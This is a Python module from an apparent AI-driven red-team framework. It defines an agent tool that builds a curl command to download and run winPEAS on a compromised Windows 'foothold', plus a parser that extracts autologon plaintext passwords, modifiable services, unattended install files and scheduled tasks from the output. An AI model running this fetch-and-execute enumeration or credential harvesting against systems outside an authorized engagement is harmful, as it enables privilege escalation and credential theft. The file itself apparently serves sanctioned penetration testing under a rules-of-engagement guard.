import re

from langchain_core.tools import tool
from pydantic import BaseModel, Field

from autored.logging import get_logger
from autored.roe_guard import roe_guard
from autored.tools.nmap import _save_raw

log = get_logger("tools.winpeas")


class WinpeasResult(BaseModel):
    host_ip: str
    autologon_credentials: list[dict] = Field(default_factory=list)
    modifiable_services: list[str] = Field(default_factory=list)
    unattended_files: list[str] = Field(default_factory=list)
    scheduled_tasks: list[str] = Field(default_factory=list)
    raw_output_path: str = ""
    command: str = ""
    duration_sec: float = 0.0


def _section_lines(text: str, header_re: str) -> list[str]:
    """Return stripped non-empty lines between a section header and the next
    ``╚`` box-drawing marker (or end of text)."""
    m = re.search(header_re + r"\n(.+?)(?=\n╚|$)", text, re.DOTALL)
    if not m:
        return []
    return [
        line.strip()
        for line in m.group(1).splitlines()
        if line.strip() and not line.startswith("╚")
    ]


def _parse_winpeas_output(text: str, host_ip: str) -> WinpeasResult:
    """Parse winpeas stdout into a WinpeasResult.

    Extracts autologon registry credentials, modifiable services, unattended
    install files, and scheduled tasks from the winpeas text output.
    """
    result = WinpeasResult(host_ip=host_ip)

    # Autologon registry block — extract DefaultDomainName / DefaultUserName /
    # DefaultPassword triplets (winpeas emits them as ``Name : Value`` lines).
    autologon_section = re.search(
        r"Autologon Registry\n(.+?)(?=\n╚|$)", text, re.DOTALL,
    )
    if autologon_section:
        section = autologon_section.group(1)
        domain_m = re.search(r"DefaultDomainName\s*:\s*(\S+)", section)
        user_m = re.search(r"DefaultUserName\s*:\s*(\S+)", section)
        pwd_m = re.search(r"DefaultPassword\s*:\s*(\S+)", section)
        if user_m or pwd_m or domain_m:
            result.autologon_credentials.append({
                "domain": domain_m.group(1) if domain_m else "",
                "username": user_m.group(1) if user_m else "",
                "password": pwd_m.group(1) if pwd_m else "",
            })

    # Modifiable services section.
    result.modifiable_services = _section_lines(text, r"Modifiable Services")

    # Unattended install files section.
    result.unattended_files = _section_lines(text, r"Unattended Files")

    # Scheduled tasks section (if present).
    result.scheduled_tasks = _section_lines(text, r"Scheduled tasks")

    return result


@tool
@roe_guard(allowed_categories=["read_only"])
async def winpeas_run(
    foothold_id: str,
    host_ip: str,
    engagement_id: str = "",
) -> WinpeasResult:
    """Run winpeas on a Windows foothold.

    The command is constructed for execution via the foothold's shell session.
    Actual execution requires the session manager (Phase 6). For now, this
    tool builds the command, saves it as raw evidence, and returns an empty
    result — the parser is invoked separately against captured output.

    Args:
        foothold_id: ID of the foothold to enumerate
        host_ip: IP of the foothold host
        engagement_id: Current engagement ID

    Returns:
        WinpeasResult (empty findings until execution is wired in Phase 6).
    """
    log.info("winpeas_start", host_ip=host_ip, foothold_id=foothold_id)
    # Command to run via foothold shell (curl winpeas + execute).
    cmd_str = (
        "curl -sL "
        "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe "
        "-o winPEASx64.exe && .\\winPEASx64.exe"
    )
    raw_path = await _save_raw("winpeas_cmd", host_ip, cmd_str, "", engagement_id)
    log.info("winpeas_done", host_ip=host_ip, note="command saved, execution in Phase 6")
    return WinpeasResult(host_ip=host_ip, raw_output_path=raw_path, command=cmd_str)
